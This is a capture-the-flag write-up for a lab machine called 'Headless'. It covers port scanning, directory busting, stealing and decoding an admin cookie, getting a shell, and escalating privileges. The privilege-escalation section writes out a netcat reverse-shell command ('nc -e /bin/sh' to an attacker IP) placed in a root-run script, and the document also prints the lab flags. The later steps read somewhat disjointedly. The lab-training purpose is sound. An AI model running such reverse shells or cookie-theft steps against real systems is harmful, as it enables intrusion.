---
{"dg-publish":true,"permalink":"/boxer/headless/"}
---

## Writeup
1. Initial Recon

``` 
sudo nmap -sT -v 10.10.11.8
```
![Pasted image 20240701122559.png](/img/user/Sources/Pasted%20image%2020240701122559.png)

2. Enumeration
```
sudo nmap -sT -A -Pn -sV 10.10.11.8
```
![Pasted image 20240701122724.png](/img/user/Sources/Pasted%20image%2020240701122724.png)

![Pasted image 20240701122750.png](/img/user/Sources/Pasted%20image%2020240701122750.png)

![Pasted image 20240701122838.png](/img/user/Sources/Pasted%20image%2020240701122838.png)


- Since the host was initially unreachable we include in local hosts list to try and access it.
```
sudo nano /etc/hosts
```

- As we have enumerated two ports are open we will try to use port 5000 to possibly access the web application
![Pasted image 20240701130649.png](/img/user/Sources/Pasted%20image%2020240701130649.png)

- As the web app is now accessible we try to explore the application
![Pasted image 20240701130737.png](/img/user/Sources/Pasted%20image%2020240701130737.png)

- We can't find around a lot of information so we try to bust directories to identify if we can excavate something interesting, we discover /dashboard is one of the directories that's present and try to explore it
![Pasted image 20240701130844.png](/img/user/Sources/Pasted%20image%2020240701130844.png)

![Pasted image 20240701130951.png](/img/user/Sources/Pasted%20image%2020240701130951.png)

- Since we are unable to access currently we will now look for methods to access it.

3. Gaining Access and Exploitation
- As we navigate through the web application we find a page with form and upload fields

```python
python3 -m http.server 8009
```

![Pasted image 20240701131957.png](/img/user/Sources/Pasted%20image%2020240701131957.png)

![Pasted image 20240701132111.png](/img/user/Sources/Pasted%20image%2020240701132111.png)

![Pasted image 20240701133824.png](/img/user/Sources/Pasted%20image%2020240701133824.png)

![Pasted image 20240701133735.png](/img/user/Sources/Pasted%20image%2020240701133735.png)

```
echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```


![Pasted image 20240701134831.png](/img/user/Sources/Pasted%20image%2020240701134831.png)

![Pasted image 20240701135237.png](/img/user/Sources/Pasted%20image%2020240701135237.png)

![Pasted image 20240701135426.png](/img/user/Sources/Pasted%20image%2020240701135426.png)

![Pasted image 20240701135819.png](/img/user/Sources/Pasted%20image%2020240701135819.png)

![Pasted image 20240701141036.png](/img/user/Sources/Pasted%20image%2020240701141036.png)

![Pasted image 20240701141056.png](/img/user/Sources/Pasted%20image%2020240701141056.png)

- 


4. Maintaining access and Extracting outputs

- Now we have gained access so let's extract the details using the shell and as we go through it we have our user flag

```
-bash-5.1$ whoami
dev
-bash-5.1$ ls
apps  user.txt
-bash-5.1$ 
-bash-5.1$ cat user.txt 

```
![Pasted image 20240701141412.png](/img/user/Sources/Pasted%20image%2020240701141412.png)

```
Flag user: 6a6ef74c6826ef1412e987d6653abc03
```

- Now we need to attempt a possible privilege escalation in order to obtain root flag. Let's explore this shell further, maybe there are hidden directories so we can try listing using ls -la command
![Pasted image 20240702065940.png](/img/user/Sources/Pasted%20image%2020240702065940.png)

```
dvir@headless:~/app$ echo "nc -e /bin/sh 10.10.14.55 1212" > initdb.sh
echo "nc -e /bin/sh 10.10.14.55 1212" > initdb.sh
dvir@headless:~/app$ 

dvir@headless:~/app$ chmod +x initdb.sh
chmod +x initdb.sh
dvir@headless:~/app$ 
```
- We found a git directory it is time to go git busting let's see if we can extract some details. We found an interesting branch while going through the logs
![Pasted image 20240702070143.png](/img/user/Sources/Pasted%20image%2020240702070143.png)



- Now let's switch to this branch to see if there is something interesting in it and we have obtained production credentials


- Let's try gaining access to this shell using SSH and we successfully do so as shown below


- We tried exploring it and we obtained info that a python3 can be executed using root for this user


- Since python is something we can use so we try listing installed libraries using pip and explore whether there is a suspicious or vulnerable library
- We find GitPython library version is vulnerable 


- So we go ahead and search for a potential POC payload to exploit it and do find one which we use to extract the root flag as follows:


- We tried obtaining shell and writing output to /tmp/root dir to extract root flag
![Pasted image 20240702065658.png](/img/user/Sources/Pasted%20image%2020240702065658.png)

- WE DO OBTAIN THE ROOT FLAG!

```
Flag root: 8a2fc2c1fafbf839a8803138f3dc4e8c
```

5. We have officially pwned the box!
